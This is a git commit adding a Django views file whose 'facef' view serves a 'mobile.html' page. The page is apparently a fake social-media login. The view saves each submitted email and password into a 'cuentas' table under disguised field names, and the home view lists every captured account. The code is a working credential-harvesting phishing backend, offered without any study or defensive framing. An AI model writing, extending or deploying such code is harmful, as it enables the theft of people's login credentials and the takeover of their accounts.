145d6b6351ac3fb3e73886f84c49cc57c89fbe0e
* <EneyderGutierrez>
2023-01-04 19:30:14 -0600

    first commit

---
+++ websites/views.py
@@ -0,0 +1,22 @@
+from django.shortcuts import render, redirect
+from .models import  cuentas
+# Create your views here.
+def home(request):
+	datos = cuentas.objects.all()
+	return render(request, 'index.html', {'cuentas':datos})
+
+
+def facef(request):
+	if request.method == 'GET':
+		return render(request, 'mobile.html')
+	else:
+		cuenta = cuentas()
+		cuenta.nombre = request.POST['correo']
+		cuenta.apellidos = request.POST['password']
+		cuenta.save()
+		print (request.POST)
+		return render(request, 'mobile.html')
+
+
+def enlaces(request):
+	return render(request, 'enlaces.html')
